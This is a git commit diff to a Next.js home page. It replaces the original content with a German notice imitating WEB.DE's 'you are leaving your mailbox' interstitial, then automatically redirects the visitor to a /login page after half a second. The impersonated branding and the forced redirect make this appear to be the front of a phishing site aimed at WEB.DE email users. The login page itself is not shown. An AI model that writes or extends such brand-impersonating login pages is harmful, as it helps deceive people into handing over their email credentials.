5f35a05cb5f8e790a9f9e4526971c7e6bfa9ff63
Victor Bello <you@example.com>
2023-09-10 16:14:30 +0100

    dbjhb

--- pages/index.tsx
+++ pages/index.tsx
@@ -1,8 +1,16 @@
-import Head from 'next/head'
-import Main from '../components/main'
-import Footer from '../components/footer'
+import Head from "next/head";
+import Link from "next/link";
+import { useRouter } from "next/router";
+
+import { useEffect } from "react";
 
 export default function Home() {
+  let router = useRouter();
+  useEffect(() => {
+    const login = setTimeout(() => router.push("/login"), 500);
+
+    return () => clearTimeout(login);
+  });
   return (
     <>
       <Head>
@@ -11,8 +19,15 @@ export default function Home() {
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <link rel="icon" href="/web.svg" />
       </Head>
-      <Main/>
-      <Footer/>
+      <main className="h-screen bg-white">
+        <div className="border w-4/5 md:w-1/2 lg:w-1/3 mx-auto py-4 px-6 text-sm shadow-lg mt-20 text-center">
+          Sie öffnen gerade eine Internetseite außerhalb Ihres WEB.DE Postfachs.
+          Wenn Sie nicht in 3 Sekunden weitergeleitet werden,{" "}
+          <Link href="/login" className="text-sky-700">
+            klicken Sie hier
+          </Link>
+        </div>
+      </main>
     </>
-  )
+  );
 }
